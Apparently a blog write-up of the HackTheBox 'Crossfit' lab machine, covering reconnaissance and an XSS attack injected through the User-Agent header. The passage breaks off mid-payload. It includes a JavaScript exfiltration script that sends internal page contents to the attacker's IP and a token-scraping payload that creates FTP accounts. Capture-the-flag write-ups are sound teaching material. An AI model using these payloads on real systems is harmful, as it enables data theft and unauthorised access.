<html>
	<head>
		<title>Crossfit</title>
		<meta name="description" content="How to lose 10 kg completing a HackTheBox machine!" />
		<meta name="robots" content="index, follow" />
		<meta property="og:title" content="Crossfit" />
		<meta property="og:site_name" content="GhostCcamm's Cyber Misadventures" />
		<meta property="og:description" content="How to lose 10 kg completing a HackTheBox machine!" />
		
        <meta property="og:image" content="/images/writeups/htb_machines/crossfit/crossfit.png" />
    
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="/assets/css/main.css" />
		<link rel="stylesheet" href="/assets/css/styles.css" />
		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Page Wrapper -->
			<div id="page-wrapper">

			<!-- Header -->
				<header id="header" class="alt">
					<h1><a href="index.html">GhostCcamm's Cyber Misadventures</a></h1>
					<nav>
						<a href="#menu">Menu</a>
					</nav>
				</header>

			<!-- Menu -->
				<nav id="menu">
					<div class="inner">
						<h2>Menu</h2>
						<ul class="links">
							<li><a href="/">Home</a></li>
							<li><a href="/blog">Blog</a></li>
							<li><a href="/writeups">Write Ups</a></li>
						</ul>
						<a href="#" class="close">Close</a>
					</div>
				</nav>

			<!-- Banner -->
		    <section id="banner">
		      <div class="inner">
		        <div class="logo"><div class="image"><img src="/images/logo.png" alt="" width="75" height="75" /></div></div>
		        <h2>Crossfit</h2>
						<p class="date">2021-01-09</p>
		        <p>How to lose 10 kg completing a HackTheBox machine!"</p>
		      </div>
		    </section>

      <section id="wrapper">
<section class="wrapper spotlight style6 ">
<div class="inner">
<div class="main_image"><img src=/images/writeups/htb_machines/crossfit/crossfit.png alt="" /></div>
<div class="content">
<h2 class="major" id="overview">
 Overview
</h2>
<p>
 <strong>
  HOLY MACKEREL THIS BOX WAS DIFFICULT!
 </strong>
</p>
<p>
 <em>
  I lost 10 kg due to the not eating anything for a week to just get this box complete!
 </em>
</p>
<p>
 Okay I lied about losing weight,
 <em>
  I am still fat...
 </em>
</p>
<p>
 Anyway, this box is one of the most rewarding boxes that is currently active on HackTheBox (as of writing this). Pulling off the XSS attack and other exploits
 <em>
  across
 </em>
 <s>
  (hah get it)
 </s>
 services was incredibly satisfying to complete and is definitely the biggest highlight of this box.
</p>
<p>
 However, this box is a
 <em>
  loooooooooooooooooooong
 </em>
 one so I hope you have some free time to read this writeup!
</p>
</div>
</div>
</section>
<section class="wrapper style5 alt">
<div class="inner">
<div class="content">

<h2 class="major" id="initial-finding-the-gym-club-website">
 Initial: Finding The Gym Club Website
</h2>
<p>
 Like always I started off with an Nmap scan to see what services are exposed on the box.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="nt">Starting</span><span class="w"> </span><span class="nt">Nmap</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">91</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">2020-12-26</span><span class="w"> </span><span class="nt">08</span><span class="p">:</span><span class="nd">43</span><span class="w"> </span><span class="nt">AWST</span><span class="w"></span>
<span class="nt">Nmap</span><span class="w"> </span><span class="nt">scan</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">crossfit</span><span class="p">.</span><span class="nc">htb</span><span class="w"> </span><span class="o">(</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">208</span><span class="o">)</span><span class="w"></span>
<span class="nt">Host</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">up</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">063s</span><span class="w"> </span><span class="nt">latency</span><span class="o">).</span><span class="w"></span>

<span class="nt">PORT</span><span class="w">   </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span><span class="w"></span>
<span class="nt">21</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ftp</span><span class="w">     </span><span class="nt">vsftpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">8</span><span class="w"> </span><span class="nt">or</span><span class="w"> </span><span class="nt">later</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="nt">ssl-cert</span><span class="o">:</span><span class="w"> </span><span class="nt">Subject</span><span class="o">:</span><span class="w"> </span><span class="nt">commonName</span><span class="o">=*</span><span class="p">.</span><span class="nc">crossfit</span><span class="p">.</span><span class="nc">htb</span><span class="o">/</span><span class="nt">organizationName</span><span class="o">=</span><span class="nt">Cross</span><span class="w"> </span><span class="nt">Fit</span><span class="w"> </span><span class="nt">Ltd</span><span class="o">./</span><span class="nt">stateOrProvinceName</span><span class="o">=</span><span class="nt">NY</span><span class="o">/</span><span class="nt">countryName</span><span class="o">=</span><span class="nt">US</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="nt">Not</span><span class="w"> </span><span class="nt">valid</span><span class="w"> </span><span class="nt">before</span><span class="o">:</span><span class="w"> </span><span class="nt">2020-04-30T19</span><span class="p">:</span><span class="nd">16</span><span class="p">:</span><span class="nd">46</span><span class="w"></span>
<span class="o">|</span><span class="nt">_Not</span><span class="w"> </span><span class="nt">valid</span><span class="w"> </span><span class="nt">after</span><span class="o">:</span><span class="w">  </span><span class="nt">3991-08-16T19</span><span class="p">:</span><span class="nd">16</span><span class="p">:</span><span class="nd">46</span><span class="w"></span>
<span class="o">|</span><span class="nt">_ssl-date</span><span class="o">:</span><span class="w"> </span><span class="nt">TLS</span><span class="w"> </span><span class="nt">randomness</span><span class="w"> </span><span class="nt">does</span><span class="w"> </span><span class="nt">not</span><span class="w"> </span><span class="nt">represent</span><span class="w"> </span><span class="nt">time</span><span class="w"></span>
<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">9p1</span><span class="w"> </span><span class="nt">Debian</span><span class="w"> </span><span class="nt">10</span><span class="o">+</span><span class="nt">deb10u2</span><span class="w"> </span><span class="o">(</span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"></span>
<span class="o">|</span><span class="w">   </span><span class="nt">2048</span><span class="w"> </span><span class="nt">b0</span><span class="p">:</span><span class="nd">e7</span><span class="p">:</span><span class="nd">5f</span><span class="p">:</span><span class="nd">5f</span><span class="p">:</span><span class="nd">7e</span><span class="p">:</span><span class="nd">5a</span><span class="p">:</span><span class="nd">4f</span><span class="p">:</span><span class="nd">e8</span><span class="p">:</span><span class="nd">e4</span><span class="p">:</span><span class="nd">cf</span><span class="p">:</span><span class="nd">f1</span><span class="p">:</span><span class="nd">98</span><span class="p">:</span><span class="nd">01</span><span class="p">:</span><span class="nd">cb</span><span class="p">:</span><span class="nd">3f</span><span class="p">:</span><span class="nd">52</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">67</span><span class="p">:</span><span class="nd">88</span><span class="p">:</span><span class="nd">2d</span><span class="p">:</span><span class="nd">20</span><span class="p">:</span><span class="nd">a5</span><span class="p">:</span><span class="nd">c1</span><span class="p">:</span><span class="nd">a7</span><span class="p">:</span><span class="nd">71</span><span class="p">:</span><span class="nd">50</span><span class="p">:</span><span class="nd">2b</span><span class="p">:</span><span class="nd">c8</span><span class="p">:</span><span class="nd">07</span><span class="p">:</span><span class="nd">a4</span><span class="p">:</span><span class="nd">b2</span><span class="p">:</span><span class="nd">60</span><span class="p">:</span><span class="nd">e5</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">256</span><span class="w"> </span><span class="nt">62</span><span class="p">:</span><span class="nd">ce</span><span class="p">:</span><span class="nd">a3</span><span class="p">:</span><span class="nd">15</span><span class="p">:</span><span class="nd">93</span><span class="p">:</span><span class="nd">c8</span><span class="p">:</span><span class="nd">8c</span><span class="p">:</span><span class="nd">b6</span><span class="p">:</span><span class="nd">8e</span><span class="p">:</span><span class="nd">23</span><span class="p">:</span><span class="nd">1d</span><span class="p">:</span><span class="nd">66</span><span class="p">:</span><span class="nd">52</span><span class="p">:</span><span class="nd">f4</span><span class="p">:</span><span class="nd">4f</span><span class="p">:</span><span class="nd">ef</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span><span class="w"></span>
<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">38</span><span class="w"> </span><span class="o">((</span><span class="nt">Debian</span><span class="o">))</span><span class="w"></span>
<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache</span><span class="o">/</span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">38</span><span class="w"> </span><span class="o">(</span><span class="nt">Debian</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache2</span><span class="w"> </span><span class="nt">Debian</span><span class="w"> </span><span class="nt">Default</span><span class="w"> </span><span class="nt">Page</span><span class="o">:</span><span class="w"> </span><span class="nt">It</span><span class="w"> </span><span class="nt">works</span><span class="w"></span>
<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">Host</span><span class="o">:</span><span class="w"> </span><span class="nt">Cross</span><span class="o">;</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span><span class="w"></span>

<span class="nt">Service</span><span class="w"> </span><span class="nt">detection</span><span class="w"> </span><span class="nt">performed</span><span class="o">.</span><span class="w"> </span><span class="nt">Please</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">any</span><span class="w"> </span><span class="nt">incorrect</span><span class="w"> </span><span class="nt">results</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">submit</span><span class="o">/</span><span class="w"> </span><span class="o">.</span><span class="w"></span>
<span class="nt">Nmap</span><span class="w"> </span><span class="nt">done</span><span class="o">:</span><span class="w"> </span><span class="nt">1</span><span class="w"> </span><span class="nt">IP</span><span class="w"> </span><span class="nt">address</span><span class="w"> </span><span class="o">(</span><span class="nt">1</span><span class="w"> </span><span class="nt">host</span><span class="w"> </span><span class="nt">up</span><span class="o">)</span><span class="w"> </span><span class="nt">scanned</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">18</span><span class="p">.</span><span class="nc">02</span><span class="w"> </span><span class="nt">seconds</span><span class="w"></span>
</code></pre>
</div>
<p>
 Firstly that FTP server looked really really juicy, especially if I can get guest access to it. Unfortunately I could not...
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">ghostccamm</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">hackthebox</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">crossfit</span><span class="err">$</span><span class="w"> </span><span class="n">ftp</span><span class="w"> </span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
<span class="n">Connected</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w"></span>
<span class="mi">220</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">Server</span><span class="w"></span>
<span class="n">Name</span><span class="w"> </span><span class="p">(</span><span class="n">crossfit</span><span class="p">.</span><span class="nl">htb</span><span class="p">:</span><span class="n">ghostccamm</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">anonymous</span><span class="w"></span>
<span class="mi">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password</span><span class="p">.</span><span class="w"></span>
<span class="nl">Password</span><span class="p">:</span><span class="w"></span>
<span class="mi">530</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">incorrect</span><span class="p">.</span><span class="w"></span>
<span class="n">Login</span><span class="w"> </span><span class="n">failed</span><span class="p">.</span><span class="w"></span>
<span class="n">ftp</span><span class="o">&gt;</span><span class="w"></span>
</code></pre>
</div>
<p>
 Welp... That didn't work, so I tried to the website instead.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/emptywebpage.png"/>
</p>
<p>
 Hmmm, I only got the default Apache page. This meant that I needed to enumerate for subdomains on the box, since at the time I could not think of an alternative attack vector based on the open services that I had found. Going back to the FTP server, I noticed that it had an SSL certificate for encryption that could provide further details about subdomains used on the box. However, Nmap did not show the full certificate so I used
 <code>
  openssl
 </code>
 to dump the full certificate. I found out later on that
 <code>
  nmap -vv -sC -sV -p 21 crossfit.htb
 </code>
 could of also dumped the necessary information from the certificate that is shown below.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">ghostccamm</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">hackthebox</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">crossfit</span><span class="err">$</span><span class="w"> </span><span class="n">openssl</span><span class="w"> </span><span class="n">s_client</span><span class="w"> </span><span class="o">-</span><span class="k">connect</span><span class="w"> </span><span class="n">crossfit</span><span class="p">.</span><span class="nl">htb</span><span class="p">:</span><span class="mi">21</span><span class="w"> </span><span class="o">-</span><span class="n">starttls</span><span class="w"> </span><span class="n">ftp</span><span class="w"></span>
<span class="n">CONNECTED</span><span class="p">(</span><span class="mi">00000003</span><span class="p">)</span><span class="w"></span>
<span class="k">depth</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">US</span><span class="p">,</span><span class="w"> </span><span class="n">ST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NY</span><span class="p">,</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.,</span><span class="w"> </span><span class="n">CN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span><span class="w"> </span><span class="n">emailAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">info</span><span class="nv">@gym</span><span class="o">-</span><span class="n">club</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
<span class="n">verify</span><span class="w"> </span><span class="nl">error</span><span class="p">:</span><span class="n">num</span><span class="o">=</span><span class="mi">18</span><span class="err">:</span><span class="n">self</span><span class="w"> </span><span class="n">signed</span><span class="w"> </span><span class="n">certificate</span><span class="w"></span>
<span class="n">verify</span><span class="w"> </span><span class="k">return</span><span class="err">:</span><span class="mi">1</span><span class="w"></span>
<span class="k">depth</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">US</span><span class="p">,</span><span class="w"> </span><span class="n">ST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NY</span><span class="p">,</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.,</span><span class="w"> </span><span class="n">CN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span><span class="w"> </span><span class="n">emailAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">info</span><span class="nv">@gym</span><span class="o">-</span><span class="n">club</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
<span class="n">verify</span><span class="w"> </span><span class="k">return</span><span class="err">:</span><span class="mi">1</span><span class="w"></span>
<span class="o">---</span><span class="w"></span>
<span class="n">Certificate</span><span class="w"> </span><span class="n">chain</span><span class="w"></span>
<span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="nl">s</span><span class="p">:</span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">US</span><span class="p">,</span><span class="w"> </span><span class="n">ST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NY</span><span class="p">,</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.,</span><span class="w"> </span><span class="n">CN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span><span class="w"> </span><span class="n">emailAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">info</span><span class="nv">@gym</span><span class="o">-</span><span class="n">club</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
<span class="w">   </span><span class="nl">i</span><span class="p">:</span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">US</span><span class="p">,</span><span class="w"> </span><span class="n">ST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NY</span><span class="p">,</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.,</span><span class="w"> </span><span class="n">CN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span><span class="w"> </span><span class="n">emailAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">info</span><span class="nv">@gym</span><span class="o">-</span><span class="n">club</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
<span class="o">---</span><span class="w"></span>

<span class="p">...</span><span class="w"></span>
</code></pre>
</div>
<p>
 <em>
  Oooooo
 </em>
 that email indicated to me that
 <code>
  gym-club.crossfit.htb
 </code>
 would be a valid subdomain on the box. So I added it to
 <code>
  /etc/hosts
 </code>
 and checked it out.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/gymclub.png"/>
</p>
<p>
 Noice I had found the Crossfit website!
</p>
</div>
</div>
</section>
<section class="wrapper style1 ">
<div class="inner">
<div class="content">

<h2 class="major" id="initial-cross-site-scripting-to-create-ftp-accounts">
 Initial: Cross Site Scripting to Create FTP Accounts
</h2>
<p>
 Now this step was pretty insane, but cool!
</p>
<p>
 I spent over an hour enumerating
 <code>
  gym-club.crossfit.htb
 </code>
 trying to find any vulnerabilities. I had a fairly good idea that an XSS attack was the most likely attack method because... well the word
 <em>
  cross
 </em>
 is in the name of the box. Unfortunately, the developers of this website had implemented some XSS security checks on uploaded comments on the page http://gym-club.crossfit.htb/blog_single.php.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/xssblocked.png"/>
</p>
<p>
 I found that the above security report notification was triggered whenever I tried to submit
 <code>
  &lt;script&gt;
 </code>
 in one of the comment fields.
</p>
<p>
 <em>
  Now the trick here is to stare at this message for 2 hours and drive yourself to insanity like what I did.
 </em>
</p>
<p>
 If you want to avoid the mental exhaustion, open up Burp Suite and look at what is being sent in your POST requests when you make a comment. Notice that your browser details is in the
 <code>
  User-Agent
 </code>
 request header and the security report that is generated will contain your
 <em>
  'browser information'
 </em>
 ?
</p>
<p>
 <strong>
  What if the developers of the site assumed that the browser information from
  <code>
   User-Agent
  </code>
  is secure and did not sanitise the input?
 </strong>
</p>
<p>
 I tested this by using Burp Suite to modify the
 <code>
  User-Agent
 </code>
 request header to
 <code>
  &lt;script src=http://&lt;my ip address here&gt;/test.js&gt;&lt;/script&gt;
 </code>
 and to see if I get a response from the server on my
 <code>
  netcat
 </code>
 listener.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/wegotxss.png"/>
</p>
<p>
 So wow, it worked! That is a pretty nifty method for XSS! A little bit guessy, but can definitely happen in real life.
</p>
<p>
 I also found a new page that I could check http://gym-club.crossfit.htb/security_threat/report.php. However, we cannot directly access the page that makes me think that this page can only be accessed by
 <code>
  localhost
 </code>
 , since there are no session cookies in the request.
</p>
<p>
 I exfiltrated the HTML of webpages by using either the XMLHttpRequest or fetch API, then base64 encoding the response as a GET parameter back to my own server. In the example below I am just using the fetch API but used XMLHttpRequest later on.
</p>
<p>
 <em>
  exfiltrate.js
 </em>
</p>
<div class="codehilite">
 <pre><span></span><code><span class="nf">fetch</span><span class="p">(</span><span class="err">"</span><span class="no">http</span><span class="p">:</span><span class="c1">//gym-club.crossfit.htb/security_threat/report.php")</span>
<span class="na">.then</span><span class="p">(</span><span class="no">function</span><span class="p">(</span><span class="no">data</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
<span class="w">    </span><span class="nf">data.text</span><span class="p">().</span><span class="no">then</span><span class="p">(</span><span class="no">function</span><span class="p">(</span><span class="no">r_txt</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
<span class="w">        </span><span class="nf">fetch</span><span class="p">(</span><span class="err">"</span><span class="no">http</span><span class="p">:</span><span class="c1">//10.10.14.33:80/get_result.html?p="+btoa(r_txt));</span>
<span class="w">    </span><span class="err">})</span><span class="c1">;</span>
<span class="err">})</span><span class="c1">;</span>
</code></pre>
</div>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/exfiltratinghtml.png"/>
</p>
<p>
 The HTML content from the security report webpage did not give me any useful information. However, I learnt that I could access locally running web servers that the developers never intended to be externally exposed.
</p>
<p>
 I started marking some educated guesses for subdomains on the machine. One of the most obvious subdomains that I guessed was
 <code>
  ftp.crossfit.htb
 </code>
 , because of the FTP server that on the box. When I connected to
 <code>
  ftp.crossfit.htb
 </code>
 I was immediately redirected to http://ftp.crossfit.htb/accounts, that showed that I could create an account for the FTP server at http://ftp.crossfit.htb/accounts/create...
</p>
<p>
 <em>
  Noooooiiiiice
 </em>
</p>
<p>
 Let's take a closer look at the POST request form on the FTP account creation page.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://ftp.crossfit.htb/accounts"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"_token"</span> <span class="na">value=</span><span class="s">"KrZi8JGDZH7PMxhTEcVyFlc0WuKTHw82PX15ObxR"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-12 col-sm-12 col-md-12"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;strong&gt;</span>Username:<span class="nt">&lt;/strong&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Username"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-12 col-sm-12 col-md-12"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;strong&gt;</span>Password:<span class="nt">&lt;/strong&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"pass"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Password"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-12 col-sm-12 col-md-12 text-center"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;/form&gt;</span>
</code></pre>
</div>
<p>
 So I just need to submit a POST request to http://ftp.crossfit.htb/accounts with the generated token and my username and password? Seems pretty easy...
 <em>
  right??
 </em>
</p>
<p>
 <strong>
  NOPE!
 </strong>
</p>
<p>
 Like always for me, I had to waste several hours on the most mundane problems. This time, the tokens that were generated and required for FTP account creation kept on expiring for me. I fiddled around with my JavaScript payload for ages, chucked out using the
 <code>
  fetch
 </code>
 API and tried to write the XSS exploit with
 <s>
  completely horrible
 </s>
 XMLHttpRequests.
</p>
<p>
 In the end, my only issue was because I was not setting the
 <code>
  withCredentials
 </code>
 property for the XMLHttpRequests to true... The property allows for cross-site
 <code>
  Access-Control
 </code>
 requests, which I obviously needed since I was completing a XSS attack. I believe that was the correct explanation as to why I needed
 <code>
  Access-Control
 </code>
 , I honestly got so frustrated I went through the documentation and just tried everything until it worked. Definitely not the best methodology for this sort of thing...
</p>
<p>
 Oh well... At least I had a working XXS payload that created an account on the FTP server, which I have shown below. My payload is actually embedded within a Python program that I wrote, but I will show that in a later section about initial foothold since it contains another payload not yet discussed.
</p>
<p>
 <em>
  payload.js
 </em>
</p>
<div class="codehilite">
 <pre><span></span><code><span class="nt">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">new</span><span class="w"> </span><span class="nt">XMLHttpRequest</span><span class="o">;</span><span class="w"></span>
<span class="nt">x</span><span class="p">.</span><span class="nc">onreadystatechange</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">function</span><span class="o">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="err">if(x.readyState</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="err">4)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
<span class="w">        </span><span class="err">r_txt</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">this.responseText</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="err">//</span><span class="w"> </span><span class="err">Gets</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">nonce</span><span class="w"> </span><span class="err">from</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">account</span><span class="w"> </span><span class="err">creation</span><span class="w"> </span><span class="err">page.</span><span class="w"></span>
<span class="w">        </span><span class="err">re</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">RegExp('&lt;input</span><span class="w"> </span><span class="err">type="hidden"</span><span class="w"> </span><span class="err">name="_token"</span><span class="w"> </span><span class="err">value="(.*?)"&gt;')</span><span class="w"></span>
<span class="w">        </span><span class="err">token</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">r_txt.match(re)</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="err">post_data</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">"_token="</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">token</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">"&amp;username=test&amp;pass=test12345678"</span><span class="w"></span>

<span class="w">        </span><span class="err">y</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">XMLHttpRequest</span><span class="p">;</span><span class="w"></span>
